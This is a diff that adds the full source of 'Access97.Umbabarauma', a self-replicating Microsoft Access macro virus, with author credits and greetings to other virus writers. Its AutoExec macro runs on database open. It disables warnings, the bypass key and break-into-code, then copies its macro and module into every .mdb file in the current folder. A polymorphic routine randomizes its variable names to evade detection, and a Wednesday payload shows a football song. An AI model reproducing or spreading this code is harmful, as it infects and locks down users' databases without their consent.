@@ -1,0 +1,60 @@
+   Attribute VB_Name = "AutoExec"
+
+   RunMacro Poly()
+   RunMacro infectme()
+
+   Attribute VB_Name = "Umbabarauma"
+   Public Const ModuleName = "Umbabarauma"
+   Option Compare Database
+   Option Explicit
+
+   Function infectme()
+   Randomize: Dim WeInfect, FilePath, MyNameIs, NewHost, ToInfect
+   Const Zero = 0, FileID = "*.mdb", OurApp = "Microsoft Access", MacroName = "AutoExec"
+   On Error Resume Next
+   DoCmd.SetWarnings (Zero)
+   SetOption "Show Hidden Objects", (Rnd * Zero)
+   CommandBars("Tools").Controls("Optionen...").Enabled = (Rnd * Zero)
+   CurrentDb.CreateProperty "AllowSpecialKeys", , (Rnd * Zero)
+   CurrentDb.CreateProperty "AllowBreakIntoCode", , (Rnd * Zero)
+   CurrentDb.CreateProperty "AllowBypassKey", , (Rnd * Zero)
+   WeInfect = False
+   If Len(CurDir) = 3 Then FilePath = CurDir Else FilePath = CurDir & "\"
+   MyNameIs = CurrentDb.Name
+   NewHost = Dir(FilePath & FileID)
+   If NewHost <> "" Then ToInfect = FilePath & NewHost
+   If MyNameIs = ToInfect Then WeInfect = True
+   If WeInfect = False Then
+   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acMacro, MacroName, MacroName
+   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acModule, ModuleName, ModuleName
+   End If
+   Do
+   WeInfect = False
+   NewHost = Dir()
+   If NewHost <> "" Then ToInfect = FilePath & NewHost
+   If MyNameIs = ToInfect Then WeInfect = True
+   If WeInfect = False Then
+   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acMacro, MacroName, MacroName
+   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acModule, ModuleName, ModuleName
+   End If
+   Loop While NewHost <> ""
+   If WeekDay(Now()) = vbWednesday And Int(Rnd * 2) = Zero Then MsgBox "Un, dois, trés, quatro..." & vbCr & vbCr & "Umbabarauma  homen gol" & vbCr & "Umbabarauma  homen gol" & vbCr & vbCr & "Joga bola  joga bola  jogador" & vbCr & "Joga bola  quero jogar bola  jogador" & vbCr & "Pula, pula, cai, levanta, sobe e desce" & vbCr & "Corre, chuta, abre espaco, vibra e agradece" & vbCr & "Olha que a cidade toda ficou vazia" & vbCr & "Nessa tarde bonita pra te ver jogar" & vbCr & vbCr & "Joga bola  jogador" & vbCr & "Joga bola  corocondo" & vbCr & vbCr & "Favela  Pelada  Favela  Pelada" & vbCr & vbCr & "Futebol  Futebol  Futebol  Futebol" & vbCr & vbCr & "  ¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸" & vbCr & "To all my football friends / jackie-" & vbCr & "  ¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸", vbInformation, "A97M.Umbarauma"
+   End Function
+   Function Poly() ' JSMP v1.1 [Access Version]
+   Dim OurCode, VARLOOP, VARPOS, NEWVAR: OurCode = Modules(ModuleName).Lines(1, 55)
+   Dim VARIABLE(1 To 15)
+   VARIABLE(1) = "OurCode": VARIABLE(2) = "VARIABLE": VARIABLE(3) = "VARLOOP": VARIABLE(4) = "VARPOS": VARIABLE(5) = "NEWVAR": VARIABLE(6) = "ModuleName": VARIABLE(7) = "Zero": VARIABLE(8) = "FileID": VARIABLE(9) = "OurApp": VARIABLE(10) = "MacroName": VARIABLE(11) = "WeInfect": VARIABLE(12) = "FilePath": VARIABLE(13) = "MyNameIs": VARIABLE(14) = "NewHost": VARIABLE(15) = "ToInfect"
+   For VARLOOP = 0 To 15
+   VARPOS = 1: NEWVAR = Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130)) & Chr((Int(Rnd * 74) + 130))
+   Do
+   VARPOS = InStr(VARPOS + 1, OurCode, VARIABLE(VARLOOP))
+   If VARPOS Then OurCode = Mid(OurCode, 1, (VARPOS - 1)) & NEWVAR & Mid(OurCode, (VARPOS + Len(VARIABLE(VARLOOP))), Len(OurCode))
+   Loop While VARPOS
+   Next
+   With Modules(ModuleName): .DeleteLines 1, 55: .InsertLines 1, OurCode: End With
+   DoCmd.Save acModule, ModuleName
+   End Function
+
+   'Access97.Umbabarauma written by jackie- /Lz0NT /MVT | Should also work under Access2000 !
+   'Dedicated to all my fo0tball friends...keep up your mind UMBABARAUMA!!!
+   'Greets to: Zer0, BJack, =9, Virtuallife, Darkman, Slage, LysKovick, Evul & Gigabyte
